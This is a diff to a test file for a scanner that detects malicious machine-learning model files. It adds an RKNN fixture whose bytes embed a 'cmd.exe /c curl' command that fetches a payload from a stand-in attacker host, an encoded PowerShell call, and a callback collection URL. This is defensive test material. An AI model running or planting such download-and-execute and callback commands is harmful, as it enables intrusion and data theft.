@@ -64,6 +64,14 @@ def _build_malicious_lightgbm() -> bytes:
     )
 
 
+def _build_malicious_rknn() -> bytes:
+    return (
+        b"RKNN\x01\x00\x00\x00"
+        b"notes=cmd.exe /c curl https://evil.example/payload && powershell -enc AAAA\n"
+        b"callback=http://198.51.100.5:8080/collect\n"
+    )
+
+
 def _corrupt_zip_member_crc(path: Path, member_name: str) -> None:
     """Patch a ZIP member CRC so full scanning sees a malformed entry."""
     with zipfile.ZipFile(path) as archive:
@@ -387,7 +395,11 @@ class TestDirectoryFileFiltering:
 
     @pytest.mark.parametrize(
         ("scanner_name", "payload"),
-        [("cntk", _build_malicious_cntkv2()), ("lightgbm", _build_malicious_lightgbm())],
+        [
+            ("cntk", _build_malicious_cntkv2()),
+            ("lightgbm", _build_malicious_lightgbm()),
+            ("rknn", _build_malicious_rknn()),
+        ],
     )
     def test_disguised_signature_backed_malicious_model_is_scanned(
         self,
@@ -410,6 +422,7 @@ class TestDirectoryFileFiltering:
         [
             b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab inputs",
             b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n",
+            b"RKNX\x01\x00\x00\x00runtime=rockchip\n",
         ],
     )
     def test_disguised_signature_near_match_remains_skipped(self, tmp_path: Path, payload: bytes) -> None:
